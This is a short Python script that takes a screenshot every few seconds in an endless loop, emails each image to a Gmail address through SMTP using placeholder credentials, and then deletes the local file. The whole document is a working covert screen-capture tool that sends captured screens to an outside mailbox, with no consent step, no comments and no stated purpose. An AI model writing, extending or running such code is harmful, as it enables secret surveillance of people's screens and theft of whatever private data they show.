import smtplib, ssl, os, sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import pyautogui
import time
import getpass

def take_screenshot():
    img = pyautogui.screenshot("img.png")

def send_email():
    sender = "yourmailaddress@gmail.com" 
    receiver = sender
    password = "yourpassword"

    msg = MIMEMultipart("alternative")
    msg["Subject"] = "Screenshot"
    msg["From"] = sender
    msg["To"] = receiver


    text = """\
    Screenshots
    -----------------
    """
    img_data = open("img.png", 'rb').read()
    part1 = MIMEText(text, "plain")
    part2 = MIMEImage(img_data, name=os.path.basename("img.png"))

    msg.attach(part1)
    msg.attach(part2)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender, password)
        server.sendmail(sender, receiver, msg.as_string())

while True:
    take_screenshot()
    send_email()
    time.sleep(2)
    os.system("del img.png")
    time.sleep(5)
